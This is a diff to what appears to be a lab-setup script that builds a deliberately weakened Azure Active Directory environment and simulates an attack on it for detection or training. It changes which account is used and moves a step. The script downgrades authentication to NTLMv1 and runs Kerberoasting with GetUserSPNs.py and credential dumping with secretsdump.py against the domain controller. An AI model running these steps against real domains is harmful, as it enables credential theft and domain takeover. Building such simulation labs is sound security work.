@@ -85,7 +85,7 @@ def generate_failed_ssh_logins():
         time.sleep(randint(1, 10))
 
 def generate_specific_failed_logons():
-    accounts = ["candice.kevin", "da-batch"]
+    accounts = ["candice.kevin", "reportAdmin"]
     source_ip = "10.0.0.10"
     for _ in range(3):
         user = choice(accounts)
@@ -683,6 +683,7 @@ Import-Module ActiveDirectory
 `$CandiceKevin = @{'Name' = 'Candice Kevin'; 'SamAccountName' = 'candice.kevin'; 'Title' = 'HR Executive'}
 `$JonSmith = @{'Name' = 'Jon Smith'; 'SamAccountName' = 'jon'}
 `$BatchAccount = @{'Name' = 'DA Batch'; 'SamAccountName' = 'da-batch'}
+`$ReportAccount = @{'Name' = 'Report Admin'; 'SamAccountName' = 'reportAdmin'}
 `$ComputerAccounts = @('appsrv01', 'appsrv02', 'db001', 'db002', 'sap01', 'sap02', 'web01', 'web02', 'print01', 'print02',
                       'backup01', 'backup02', 'email01', 'email02', 'dns01', 'dns02', 'file01', 'file02', 'app03', 'db003',
                       'web03', 'web04', 'sap03', 'sap04', 'file03')
@@ -754,6 +755,10 @@ New-ADUser -Name `$BatchAccount.Name -SamAccountName `$BatchAccount.SamAccountNa
 Write-Output "User `$(`$BatchAccount.Name) created in Admins OU"
 Add-ADGroupMember -Identity 'Domain Admins' -Members `$BatchAccount.SamAccountName 
 Write-Output "User `$(`$BatchAccount.Name) added to group Domain Admins"
+
+New-ADUser -Name `$ReportAccount.Name -SamAccountName `$ReportAccount.SamAccountName -UserPrincipalName "`$(`$ReportAccount.SamAccountName)@`$domainDNS" -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Path "OU=Admins,OU=Corp,`$domainDN" 
+Write-Output "User `$(`$ReportAccount.Name) created in Admins OU"
+
 
 # Create computer accounts in Servers OU
 foreach (`$computer in `$ComputerAccounts) {
@@ -948,6 +953,8 @@ sleep 30
 su - adm0 -c 'whoami'
 su - adm0 -c 'DISPLAY=:99 xfreerdp --version'
 su - adm0 -c 'DISPLAY=:99 timeout 90 xfreerdp /v:10.0.0.6 /u:adm0 /p:'$adminPassword' /dynamic-resolution /cert:ignore &'
+python3 /tmp/temp_script.py
+sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
 "@
 
 $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $web01Name -CommandId "RunShellScript" -ScriptString $Command 
@@ -987,7 +994,7 @@ Write-Output "LAN Manager Authentication Level downgraded to NTLMv1 successfully
 
 `$FileSharePath = "\\10.0.0.4\HealthReports"
 `$securePassword = ConvertTo-SecureString "$adminPassword" -AsPlainText -Force
-`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\da-batch", `$securePassword)
+`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\reportAdmin", `$securePassword)
 
 # Directly access the file share with the specified credentials
 `$session = New-PSDrive -Name TempShare -PSProvider FileSystem -Root `$FileSharePath -Credential `$Credential
@@ -998,7 +1005,7 @@ try {
 }
 
 #Start-Process powershell.exe -Credential `$Credential -ArgumentList "-Command Get-ChildItem -Path `$FileSharePath; Start-Sleep -Seconds 1;Exit"
-Write-Output "Accessed a folder under da-batch account, with downgraded NTLM."
+Write-Output "Accessed a folder under reportAdmin account, with downgraded NTLM."
 "@
 # Connect with NTLMv1
 $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "mserv" -CommandId "RunPowerShellScript" -ScriptString $mservscript 
@@ -1146,7 +1153,7 @@ $output.Value | ForEach-Object { $_.Message }
 $mservscript = @"
 `$FileSharePath = "\\10.0.0.4\HealthReports"
 `$securePassword = ConvertTo-SecureString "$adminPassword" -AsPlainText -Force
-`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\da-batch", `$securePassword)
+`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\reportAdmin", `$securePassword)
 
 
 # Directly access the file share with the specified credentials
@@ -1158,7 +1165,7 @@ try {
 }
 
 #Start-Process powershell.exe -Credential `$Credential -ArgumentList "-Command Get-ChildItem -Path `$FileSharePath; Start-Sleep -Seconds 1;Exit"
-Write-Output "Accessed a folder under da-batch account, with downgraded NTLM."
+Write-Output "Accessed a folder under reportAdmin account, with downgraded NTLM."
 
 
 
@@ -1519,13 +1526,9 @@ $output.Value | ForEach-Object { $_.Message }
 # Final stage of the attack
 # LDAP Simple Bind, Kerberosting, Lateral Movement to mserv, AD compromise
 
-
-
 # Bash command to create and run the Python script
 $Command = @"
 #!/bin/bash
-python3 /tmp/temp_script.py
-sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
 sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
 "@
 
